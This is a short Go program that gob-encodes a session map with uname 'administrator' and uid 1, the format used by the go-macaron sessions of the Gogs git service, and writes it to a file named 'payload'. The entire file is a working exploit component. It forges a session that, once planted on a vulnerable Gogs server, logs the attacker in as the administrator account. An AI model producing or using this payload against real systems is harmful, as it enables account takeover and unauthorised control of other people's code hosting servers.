package main

import (
  "bytes"
  "encoding/gob"
  "io/ioutil"
  "fmt"
)  

// https://github.com/gogs/gogs/blob/be6bb5314ee7d8ed53362d8e6893b061e5210f48/vendor/github.com/go-macaron/session/utils.go#L38-L45
func EncodeGob(obj map[interface{}]interface{}) ([]byte, error) {
  for _, v := range obj {
    gob.Register(v)
  }
  buf := bytes.NewBuffer(nil)
  err := gob.NewEncoder(buf).Encode(obj)
  return buf.Bytes(), err
}


func main() {
  var data []byte
  var kv = make(map[interface{}]interface{})
  // https://github.com/gogs/gogs/blob/be6bb5314ee7d8ed53362d8e6893b061e5210f48/models/user.go#L50-L52
  // https://github.com/gogs/gogs/blob/be6bb5314ee7d8ed53362d8e6893b061e5210f48/routes/user/auth.go#L127-L128
  kv["uname"]= "administrator" // user uname
  kv["uid"]= int64(1) // user id
  fmt.Println(kv) 

  data, err := EncodeGob(kv);
  if err !=nil { 
    fmt.Println(err)
  }
  ioutil.WriteFile("payload", data, 0644)

}
